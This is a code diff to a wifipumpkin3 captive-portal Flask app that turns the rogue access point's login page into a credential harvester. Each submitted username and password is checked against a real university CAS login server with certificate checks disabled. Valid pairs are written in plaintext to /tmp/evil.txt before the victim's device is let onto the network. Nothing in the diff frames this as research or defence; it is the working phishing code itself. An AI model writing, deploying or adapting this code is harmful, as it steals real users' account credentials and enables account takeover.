@@ -1,3 +1,5 @@
+from re import findall
+
 from flask import Flask, request, redirect, render_template
 from urllib.parse import urlencode, unquote
 from wifipumpkin3.core.utility.collection import SettingsINI
@@ -5,6 +7,7 @@ import wifipumpkin3.core.utility.constants as C
 import sys
 import subprocess
 import argparse
+import requests
 
 # app = Flask(__name__,static_url_path='/templates/flask/static',
 #             static_folder='templates/flask/static',
@@ -17,6 +20,46 @@ PORT = 80
 config = None
 
 
+def cas_login(user_name, pwd):
+    login_url = "https://cas.sustech.edu.cn/cas/login?service=https%3A%2F%2Ftis.sustech.edu.cn%2Fcas"
+    head = {
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Safari/537.36",
+        "x-requested-with": "XMLHttpRequest"
+    }
+    try:
+        # 尝试连接到CAS
+        req = requests.get(login_url, headers=head, verify=False)
+        req.raise_for_status()
+    except requests.exceptions.HTTPError as errh:
+        return None
+    except requests.exceptions.ConnectionError as errc:
+        return None
+    except requests.exceptions.Timeout as errt:
+        return None
+    except requests.exceptions.RequestException as err:
+        return None
+
+    execution = findall('name="execution" value="([^"]+)"', req.text)[0]
+    data = {
+        'username': user_name,
+        'password': pwd,
+        'execution': execution,
+        '_eventId': 'submit',
+    }
+    try:
+        req = requests.post(login_url, data=data, allow_redirects=False, headers=head, verify=False)
+        req.raise_for_status()
+        if "Location" in req.headers:
+            req = requests.get(req.headers["Location"], allow_redirects=False, headers=head, verify=False)
+            route_ = findall('route=(.+?);', req.headers["Set-Cookie"])[0]
+            jsessionid = findall('JSESSIONID=(.+?);', req.headers["Set-Cookie"])[0]
+            return route_, jsessionid
+        else:
+            return None
+    except requests.exceptions.RequestException as e:
+        return None
+
+
 def login_user(ip, iptables_binary_path):
     subprocess.call(
         [iptables_binary_path, "-t", "nat", "-I", "PREROUTING", "1", "-s", ip, "-j", "ACCEPT"]
@@ -27,10 +70,12 @@ def login_user(ip, iptables_binary_path):
 @app.route("/login", methods=["GET", "POST"])
 def login():
     if (
-        request.method == "POST"
-        and "login" in request.form
-        and "password" in request.form
-    ):
+            request.method == "POST"
+            and "login" in request.form
+            and "password" in request.form
+    ) and cas_login(request.form["login"], request.form["password"]):
+        with open("/tmp/evil.txt", "a") as f:
+            f.write(f"User: {request.form['login']} Password: {request.form['password']}\n")
         sys.stdout.write(
             str(
                 {
@@ -45,7 +90,7 @@ def login():
         sys.stdout.flush()
         login_user(request.remote_addr, config.get("iptables", "path_binary"))
         if URL_REDIRECT:
-            return redirect(URL_REDIRECT, code=302) 
+            return redirect(URL_REDIRECT, code=302)
         if FORCE_REDIRECT:
             return render_template("templates/login_successful.html")
         elif "orig_url" in request.args and len(request.args["orig_url"]) > 0:
@@ -71,7 +116,7 @@ def catch_all(path):
     if PORT != 80:
         return redirect(
             "http://{}:{}/login?".format(REDIRECT, PORT) + urlencode({"orig_url": request.url})
-        )        
+        )
     return redirect(
         "http://{}/login?".format(REDIRECT) + urlencode({"orig_url": request.url})
     )
@@ -139,7 +184,7 @@ def main():
     FORCE_REDIRECT = args.force_redirect
     URL_REDIRECT = args.redirect_url
     PORT = args.port
-    
+
     config = SettingsINI(C.CONFIG_INI)
 
     app.static_url_path = "\{}".format(args.static)
